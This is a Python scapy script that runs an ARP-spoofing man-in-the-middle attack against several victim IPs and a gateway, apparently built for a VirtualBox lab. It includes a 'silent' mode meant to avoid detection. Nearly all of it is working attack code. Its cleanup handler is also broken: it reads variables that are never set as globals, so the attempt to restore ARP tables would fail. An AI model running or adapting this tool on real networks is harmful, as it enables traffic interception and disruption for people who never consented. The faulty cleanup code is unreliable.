#!/usr/bin/env/ python
# -*- coding: utf-8 -*-

from scapy.all import *
import time
import sys
import os
import signal
import argparse

# =============================
# Example usage in Terminal:
#
# Silent mode:
#
# sudo python3 arp_poisoner_modes.py \
#  --victims 192.168.56.101 192.168.56.104 \                    ---if multiple victims
#  --gateway 192.168.56.102 \
#  --iface enp0s3 \
#  --mode silent                                               --- mode can aggressive or custom as well
#
# =====================================


# ================================
# Function: Get MAC from IP
# ================================
def get_mac(ip, interface):
    """
    Sends an ARP request and returns the MAC address for a given IP.

    """
    arp_request = ARP(pdst = ip)  # Ask: who has this IP?
    broadcast = Ether(dst = "ff:ff:ff:ff:ff:ff")  # Send to everyone on LAN
    packet = broadcast / arp_request           # Stack layers: Ethernet + ARP

    answered = srp(packet, timeout=2, verbose=False, iface=interface)[0]  # Send and wait for reply
    if answered:
        print("[!] Response for IP")
        print(ip)
        return answered[0][1].hwsrc  # Return the MAC from the reply
    else:
        print('[!] No response for IP')
        print(ip)
        sys.exit(1)

# ================================
# Function: Send ARP Spoof Packet
# ================================
def spoof(victim_ip, victim_mac, spoof_ip, interface):
    """
    Sends a spoofed ARP reply to a victim to trick them.

    This makes the victim associate real IP,MAC they want to send to,actually with the attacker's MAC.
    """
    ether = Ether(dst = victim_mac)
    arp = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip)
    packet = ether/arp
    sendp(packet, verbose=False, iface=interface)

# ================================
# Function: Restore ARP Table
# ================================
def restore(victim_ip, victim_mac, real_ip, real_mac, interface):
    """
    Sends the correct ARP reply to fix the ARP table after poisoning
    """
    ether = Ether(dst = victim_mac, src = real_mac)
    arp = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=real_ip, hwsrc=real_mac)
    packet = ether/arp
    sendp(packet, count = 5, verbose=False, iface=interface)

# --- Ctrl+C restores ARP tables ---
def stop(sig, frame):
    global victim_macs, gateway_ip, mac_gateway, iface
    print(" Ctrl+C detected, restoring ARP tables...")
    for ip, mac in victim_macs.items():
        restore(ip, mac, gateway_ip, mac_gateway, iface)
        restore(gateway_ip, mac_gateway, ip, mac, iface)
    #print("Network restored.")
    sys.exit(0)
# ================================
# Main Program Entry Point
# ================================
def main():
    # --- Command-line Interface ---
    parser = argparse.ArgumentParser(description="Multi-Host ARP Spoofing Tool with Operational Modes")
    parser.add_argument("--victims", nargs="+", required=True, help="List of victim IPs")
    parser.add_argument("--gateway", required=True, help="IP of the gateway or middle host")
    parser.add_argument("--iface", required=True, help="Network interface (e.g., eth0, enp0s3)")
    parser.add_argument("--mode", choices=["silent", "aggressive", "custom"], default="custom", help="Spoofing mode")
    parser.add_argument("--sleep", type=float, default=2.0, help="Custom sleep time (used only in custom mode)")
    parser.add_argument("--manual", action="store_true", help="Use hardcoded MAC addresses instead of resolving")

    args = parser.parse_args()

    iface = args.iface
    gateway_ip = args.gateway
    victim_ips = args.victims

    # --- Set Spoofing Rate Based on Mode ---
    if args.mode == "silent":
        sleep_time = 10.0  # Slow: less detectable
    elif args.mode == "aggressive":
        sleep_time = 0.5   # Fast: more likely to be detected
    else:
        sleep_time = args.sleep  # User-defined

    # --- Get MAC Addresses of M1,M2 for testing puposes---
    if args.manual:
        print("[*] Using hardcoded MAC addresses (manual mode).")
        hardcoded_victims = {
            "192.168.56.101": "08:00:27:B7:C4:AF",
            "192.168.56.102": "08:00:27:CC:08:6F",
        }
        # MAC of M2
        mac_gateway = "08:00:27:CC:08:6F"
        victim_macs = {ip: hardcoded_victims[ip] for ip in victim_ips}
    else:
        print("[*] Resolving MAC addresses dynamically...")
        mac_gateway = get_mac(gateway_ip, iface)
        victim_macs = {ip: get_mac(ip, iface) for ip in victim_ips}

    signal.signal(signal.SIGINT, stop)

    # --- ARP Spoofing Loop ---
    print("Starting ARP spoofing in mode. Press Ctrl+C to stop.")
    while True:
        for ip, mac in victim_macs.items():
            spoof(ip, mac, gateway_ip, iface)           # Tell victim: "Gateway is at my MAC"
            spoof(gateway_ip, mac_gateway, ip, iface)   # Tell gateway: "Victim is at my MAC"
        time.sleep(sleep_time)

# ================================
# Run If Executed as Script
# ================================
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Please run this script as root (sudo).")
        sys.exit(1)
    main()